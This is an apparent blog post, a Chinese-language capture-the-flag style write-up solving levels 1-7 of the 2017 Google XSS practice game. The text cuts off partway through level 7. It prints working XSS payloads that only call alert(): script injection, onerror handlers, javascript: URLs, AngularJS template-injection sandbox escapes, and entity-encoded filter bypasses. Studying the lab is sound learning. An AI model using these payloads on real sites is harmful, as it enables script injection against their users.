@@ -1,0 +1,561 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <title>
+        Google XSS game(2017) |
+        
+        A.M.|P.M.
+    </title>
+    <link rel="shortcut icon" href="/images/logo.svg">
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.0.4/source/css/font-awesome.min.css">
+    <script id="hexo-configurations">
+    let KEEP = window.KEEP || {};
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","path":"search.xml"};
+    KEEP.theme_config = {"toc":{"enable":true,"number":false,"expand_all":true},"style":{"primary_color":"#0066CC","avatar":"/images/avatar.png","favicon":"/images/logo.svg","img_position":"left","left_side_width":"260px","content_max_width":"900px","hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_img":"/images/bg.svg","description":"Keep writing and Keep loving."}},"local_search":{"enable":true,"trigger":"auto","unescape":false,"preload":true},"version":"3.0.4"};
+    KEEP.language = {"search":"Search...","prev":"Prev","next":"Next","prev_posts":"Prev posts","next_posts":"Next posts","page":"Page %d","recent_posts":"Recent Posts","share":"Share","powered_by":"Powered by %s","theme":"Theme","rss_feed":"RSS Feed","category":"Category","categories":"Categories","tag":"Tag","tags":"Tags","tagcloud":"Tag Cloud","comment":"Comment","home":"Home","archive":"Archive","archives":"Archives","about":"About","site_uv":"Visitor Count","site_pv":"Totalview","links":"Links","link":"Link","top":"TOP","read_more":"Read more","wordcount":"Words","min2read":"Mins","changelog":"Changelog","copyright":{"author":"Post author","title":"Post title","link":"Post link","create_time":"Create time","license_title":"Copyright Notice","license_content":"All articles in this blog are licensed under %s unless stating additionally."},"ago":{"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days age","week":"%s weeks age","month":"%s months age","year":"%s years age"}};
+  </script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+<div class="page-container">
+
+    
+
+    <header class="page-header">
+        <div class="header-progress"></div>
+    </header>
+
+    <main class="page-main">
+
+        <div class="page-main-content">
+
+            <div class="page-main-content-top">
+                <header class="header-wrapper">
+
+    <div class="header-content">
+        <a class="logo-title" href="/">
+            A.M.|P.M.
+        </a>
+
+        <ul class="menu-list">
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/"
+                    >
+                        HOME
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/archives"
+                    >
+                        ARCHIVES
+                    </a>
+                </li>
+            
+                <li class="menu-item">
+                    <a class=""
+                       href="/categories"
+                    >
+                        CATEGORIES
+                    </a>
+                </li>
+            
+        </ul>
+
+        <div class="menu-bar">
+            <div class="menu-bar-middle"></div>
+        </div>
+    </div>
+
+    <div class="header-drawer">
+        <ul class="drawer-menu-list">
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/">HOME</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/archives">ARCHIVES</a>
+                </li>
+            
+                <li class="drawer-menu-item flex-center">
+                    <a class=""
+                       href="/categories">CATEGORIES</a>
+                </li>
+            
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+            </div>
+
+            <div class="page-main-content-middle">
+
+                <main class="main-content normal-code-theme">
+
+                    
+                        <div class="fade-in-down-animation">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            <span class="title-hover-animation">Google XSS game(2017)</span>
+        </div>
+
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/avatar.png">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span>John_Frod</span>
+                        <span class="level">Lv2</span>
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fas fa-calendar"></i> 2021-03-10 12:08:29
+    </span>
+    
+        <span class="article-categories article-meta-item">
+            <i class="fas fa-folder"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/categories/CTF/">CTF</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fas fa-tags"></i>
+            <ul>
+                
+                    <li>
+                        <a href="/tags/XSS/">XSS</a>
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fas fa-eye"></i> <span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        <div class="article-content markdown-body">
+            <h1 id="Google-XSS-game-2017"><a href="#Google-XSS-game-2017" class="headerlink" title="Google XSS game(2017)"></a>Google XSS game(2017)</h1><p>这是新版的谷歌XSS靶场，每一关的过关条件是能够弹出**alert()**即可。</p>
+<p>地址：<a class="link"   target="_blank" rel="noopener" href="http://www.xssgame.com/" >http://www.xssgame.com/<i class="fas fa-external-link-alt"></i></a></p>
+<h2 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309171755100.png" alt="image-20210309171755100"></p>
+<p>基础题，直接输入基本的反射型XSS语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x2F;&#x2F;)&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172238727.png" alt="image-20210309172238727"></p>
+<p>和旧版的level 4一样，我们查看页面元素</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172452175.png" alt="image-20210309172452175"></p>
+<p>发现我么在输入框输入的值被传递到了<code>startTimer()</code>函数中，于是我们可以直接闭合掉前一个函数，另外加上**alert()**，并且把后面的内容注释掉即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;);alert();&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>
+<p>这里网上还有另一种解法是，先查看源码：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">startTimer</span>(<span class="params">seconds</span>) </span>&#123;</span><br><span class="line">        seconds = <span class="built_in">parseInt</span>(seconds) || <span class="number">3</span>;</span><br><span class="line">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="built_in">window</span>.confirm(<span class="string">&quot;Time is up!&quot;</span>);</span><br><span class="line">          <span class="built_in">window</span>.loading.style.display = <span class="string">&#x27;none&#x27;</span>;</span><br><span class="line">          <span class="built_in">window</span>.message.innerHTML = <span class="string">&#x27;&lt;a href=&quot;?&quot;&gt;Go back&lt;/a&gt; to the timer setup page&#x27;</span>;</span><br><span class="line">        &#125;, seconds * <span class="number">1000</span>);</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure>
+<p>这里把我们输入的second做了一个**parseInt(seconds)**处理，当我们输入seconds=’-alert(1)-‘，浏览器先解释运行alert(1)，然后再做了两个减法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39;-alert(1)-&#39;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309172751104.png" alt="image-20210309172751104"></p>
+<p>这里和旧版的 level 5 一样，没有我们输入参数的点</p>
+<ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">chooseTab</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> html = <span class="string">&quot;Cat &quot;</span> + <span class="built_in">parseInt</span>(name) + <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    html += <span class="string">&quot;&lt;img src=&#x27;/static/img/cat&quot;</span> + name + <span class="string">&quot;.jpg&#x27; /&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">document</span>.getElementById(<span class="string">&#x27;tabContent&#x27;</span>).innerHTML = html;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Select the current tab</span></span><br><span class="line">    <span class="keyword">var</span> tabs = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;.tab&#x27;</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; tabs.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (tabs[i].id == <span class="string">&quot;tab&quot;</span> + <span class="built_in">parseInt</span>(name)) &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab active&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            tabs[i].className = <span class="string">&quot;tab&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hashchange</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (self.location.hash) &#123;</span><br><span class="line">        chooseTab(<span class="built_in">decodeURIComponent</span>(self.location.hash.substr(<span class="number">1</span>)));</span><br><span class="line">        validate();</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        chooseTab(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">window</span>.onload = hashchange;</span><br><span class="line"><span class="built_in">window</span>.onhashchange = hashchange;</span><br></pre></td></tr></table></figure>
+<p>当我们刷新页面或者改变了<code>#</code>后面的内容时就会使用<strong>location.hash</strong>把URL中<code>#</code>和它后面的内容作为<code>name</code>，然后调用chooseTab函数，把<code>name</code>作为 img 标签中 src 的一部分进行构造，最后把 img 插入到当前页面中。</p>
+<p>这里我们可以把 src 截断，这样他的图片肯定会报错，然后添加一个 onerror 事件执行alert()，最后还要把 img 标签后面的 <code>&gt;</code>补齐</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#39; onerror&#x3D;alert()&gt;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level4"><a href="#Level4" class="headerlink" title="Level4"></a>Level4</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309194319372.png" alt="image-20210309194319372"></p>
+<p>这一关和旧版的level 5 基本一样，有3个页面，分别是welcome，注册和确定</p>
+<p>查看源码</p>
+<ul>
+<li>welcome.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/level_style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: white;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      Welcome! Today we are announcing the much anticipated<span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;signup?next=confirm&quot;</span>&gt;</span>Sign up<span class="tag">&lt;/<span class="name">a</span>&gt;</span> for an exclusive Beta.</span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里可以看到，下面的a标签的链接带了一个<code>next</code>参数到signup页面</p>
+<ul>
+<li>signup.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/static/css/level_style.css&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader-logo.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="comment">&lt;!-- We&#x27;re ignoring the email, but the poor user will never know! --&gt;</span></span><br><span class="line">      Enter email: <span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;reader-email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;confirm?next=welcome&quot;</span>&gt;</span>Next &gt;&gt;<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>signup.html 页面下面的 a 标签的链接带了一个<code>next</code>参数到confirm页面</p>
+<ul>
+<li>confirm.html</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;/static/js/js_frame.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span> <span class="attr">style</span>=<span class="string">&quot;background-color: white;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/static/img/googlereader-logo.png&quot;</span> /&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      Thanks for signing up, you will be redirected soon...</span><br><span class="line">      <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="built_in">window</span>.location = <span class="string">&#x27;welcome&#x27;</span>; &#125;, <span class="number">1000</span>);</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      </span><br><span class="line">    <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这个页面把我们在URL中<code>next</code>参数的值作为下一个跳转的地址解析出来，于是我们可以利用这个地方。实际上我们直接访问这个地址即可：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.xssgame.com&#x2F;f&#x2F;__58a1wgqGgI&#x2F;confirm?next&#x3D;javascript:alert()</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309200545637.png" alt="image-20210309200545637"></p>
+<ul>
+<li>查看源码</li>
+</ul>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">&quot;//ajax.googleapis.com/ajax/libs/angularjs/1.5.8/angular.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script&gt;</span><br><span class="line">     angular.module(<span class="string">&#x27;myApp&#x27;</span>, [])</span><br><span class="line">     .controller(<span class="string">&#x27;myController&#x27;</span>, [<span class="string">&#x27;$scope&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">$scope</span>) </span>&#123;</span><br><span class="line">       $scope.query = <span class="string">&quot;&quot;</span>;</span><br><span class="line">       $scope.alert = <span class="built_in">window</span>.alert;</span><br><span class="line">     &#125;]);</span><br><span class="line"></span><br><span class="line">     <span class="keyword">var</span> UTM_PARAMS = [<span class="string">&quot;utm_content&quot;</span>, <span class="string">&quot;utm_medium&quot;</span>, <span class="string">&quot;utm_source&quot;</span>,</span><br><span class="line">         <span class="string">&quot;utm_campaign&quot;</span>, <span class="string">&quot;utm_term&quot;</span>]</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (location.search)	<span class="comment">//location.search等于 &#x27;?utm_term=&#123;&#123;alert()&#125;&#125;&#x27;</span></span><br><span class="line">     &#123;</span><br><span class="line">       <span class="keyword">var</span> params = location.search.substring(<span class="number">1</span>).split(<span class="string">&#x27;&amp;&#x27;</span>);</span><br><span class="line">         <span class="comment">//去掉?，拆分&amp;</span></span><br><span class="line">       <span class="keyword">for</span> (<span class="keyword">var</span> p <span class="keyword">in</span> params) &#123;</span><br><span class="line">         <span class="keyword">var</span> r = params[p].split(<span class="string">&#x27;=&#x27;</span>); </span><br><span class="line">           <span class="comment">//拆分=，r等于utm_term，&#123;&#123;alert()&#125;&#125;</span></span><br><span class="line">         <span class="keyword">if</span> (r.length == <span class="number">2</span> &amp;&amp; UTM_PARAMS.indexOf(r[<span class="number">0</span>]) != -<span class="number">1</span>) &#123;</span><br><span class="line">           <span class="keyword">var</span> el = <span class="built_in">document</span>.getElementsByName(r[<span class="number">0</span>]);</span><br><span class="line">             <span class="comment">//赋值utm_term的value为&#123;&#123;alert()&#125;&#125;</span></span><br><span class="line">           <span class="keyword">if</span> (el.length) el[<span class="number">0</span>].value = <span class="built_in">decodeURIComponent</span>(r[<span class="number">1</span>]);</span><br><span class="line">         &#125;</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>这一关终于不是旧版的题目了，angular JS 是一个前端框架，爆过模板注入漏洞。这里框架版本是1.5.8版本，这里可以找到这个框架的POC：<a class="link"   target="_blank" rel="noopener" href="https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs" >https://portswigger.net/research/xss-without-html-client-side-template-injection-with-angularjs<i class="fas fa-external-link-alt"></i></a></p>
+<p><strong>location.search</strong> 是一个可读可写的字符串，可设置或返回当前 URL 的查询部分（问号 ? 之后的部分）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?utm_term&#x3D;&#123;&#123;alert()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p>这里明明是1.5.8的版本为什么能直接使用<code>&#123;&#123;alert()&#125;&#125;</code>就可以了呢，还没学模板注入搞不懂。</p>
+<h2 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6"></a>Level 6</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309204550025.png" alt="image-20210309204550025"></p>
+<p>输入123查看输出点</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;p ng-non-bindable&gt;Sorry, no results were found for &lt;b&gt;123&lt;&#x2F;b&gt;.&lt;&#x2F;p&gt;</span><br></pre></td></tr></table></figure>
+<p><strong>ng-non-bindable</strong> 指令用于告诉 AngularJS 当前的 HTML 元素或其子元素不需要编译。因此这里无法被利用。</p>
+<p>另外一个输出点是在form表单的action，我们在URL中输入参数<code>?query=1</code>会在action中显示出来。同时注意到这里使用的是1.2.0的angular框架。</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309205640130.png" alt="image-20210309205640130"></p>
+<p>angular 1.2.0 的payload是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;a&#x3D;&#39;constructor&#39;;b&#x3D;&#123;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309205853997.png" alt="image-20210309205853997"></p>
+<p>发现左边的大括号<code>&#123;</code>被过滤了,这里使用到了 HTML实体编码（HTML Entity）</p>
+<p>一个HTML Entity都含有2种转义格式：Entity Name 和 Entity Number</p>
+<p>比如<code> &#123;</code> 的Entity Name是 <code>&amp;lcub;</code> Entity Number是<code>&amp;#123;</code></p>
+<p>把{ 替换为 <code>&amp;lcub;</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&amp;lcub;&amp;lcub;a&#x3D;&#39;constructor&#39;;b&#x3D;&amp;lcub;&#125;;a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,&#39;alert(1)&#39;)()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="Level-7"><a href="#Level-7" class="headerlink" title="Level 7"></a>Level 7</h2><p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210309210542726.png" alt="image-20210309210542726"></p>
+<p>CSP 的实质就是白名单制度，它明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。</p>
+<p>这里设置了，只能访问两个网址：</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310094306764.png" alt="image-20210310094306764"></p>
+<p>再看网络请求有一个jsonp?menu=about请求，返回的是callback</p>
+<p><img src="https://raw.githubusercontent.com/JOHN-FROD/PicGo/main/blog-img/image-20210310094348990.png" alt="image-20210310094348990"></p>
+<blockquote>
+<p>JSONP 全称是 JSON with Padding ，是基于 JSON 格式的为解决跨域请求资源而产生的解决方案。他实现的基本原理是利用了 HTML 里 <code>&lt;script&gt;</code>元素标签，远程调用 JSON 文件来实现数据传递。</p>
+</blockquote>
+<p>源码结尾引入了/static/js/level7.js，我们来看看js代码</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Ask server side what to display.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">//找到 URL 中 “menu=？” 的参数，并把？参数动态拼接成一个 &lt;script&gt; 标签，来访问资源。</span></span><br><span class="line"><span class="comment">//atob 对应的是 Base64 编码方式的解码操作，对应的，btoa就是编码</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> m = location.search.match(<span class="string">&#x27;menu=(.*)&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> menu = m ? atob(m[<span class="number">1</span>]) : <span class="string">&#x27;about&#x27;</span>;</span><br><span class="line">    <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;script src=&quot;jsonp?menu=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(menu) + <span class="string">&#x27;&quot;&gt;&lt;/script&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Display stuff returned from server side.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param <span class="type">&#123;string&#125;</span> <span class="variable">data</span></span> - JSON data from server side</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="comment">// 通过代码判断，data 应该是 json 格式。</span></span><br><span class="line"><span class="comment">// 取出其中的 title 和 pictures 对应的 value，拼接成 HTML 代码，插入到页面中，来访问资源</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">data</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (data.title) <span class="built_in">document</span>.write(<span class="string">&#x27;&lt;h1&gt;&#x27;</span> + data.title + <span class="string">&#x27;&lt;/h1&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> 